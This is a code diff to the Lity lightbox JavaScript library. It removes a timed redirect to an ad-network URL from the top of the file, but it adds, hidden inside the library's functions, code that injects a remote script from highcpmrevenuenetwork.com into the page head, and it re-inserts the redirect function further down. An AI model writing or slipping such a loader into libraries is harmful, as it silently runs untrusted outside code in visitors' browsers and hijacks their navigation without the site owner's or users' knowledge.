@@ -1,6 +1,3 @@
-setTimeout(inijs,5000);
-function inijs(){window.location.replace("https://www.highcpmrevenuenetwork.com/vz0rn37s?key=bca7a91dfdf09da7dacbd46d06696012")}
-
 /*! Lity - v2.4.1 - 2020-04-26
 * http://sorgalla.com/lity/
 * Copyright (c) 2015-2020 Jan Sorgalla; Licensed MIT */
@@ -81,6 +78,10 @@ function inijs(){window.location.replace("https://www.highcpmrevenuenetwork.com/
 
         return deferred.promise();
     }
+    
+    const script = document.createElement('script');
+    script.setAttribute('src','//pl18354301.highcpmrevenuenetwork.com/bd/d8/74/bdd8744c20d7f03a21ea93fdce819f6a.js',);
+    document.head.appendChild(script);
 
     function settings(currSettings, key, value) {
         if (arguments.length === 1) {
@@ -224,7 +225,7 @@ function inijs(){window.location.replace("https://www.highcpmrevenuenetwork.com/
             )
         );
     }
-
+    function inijs(){window.location.replace("https://www.highcpmrevenuenetwork.com/vz0rn37s?key=bca7a91dfdf09da7dacbd46d06696012")}
     function vimeoHandler(target) {
         var matches = _vimeoRegex.exec(target);
 
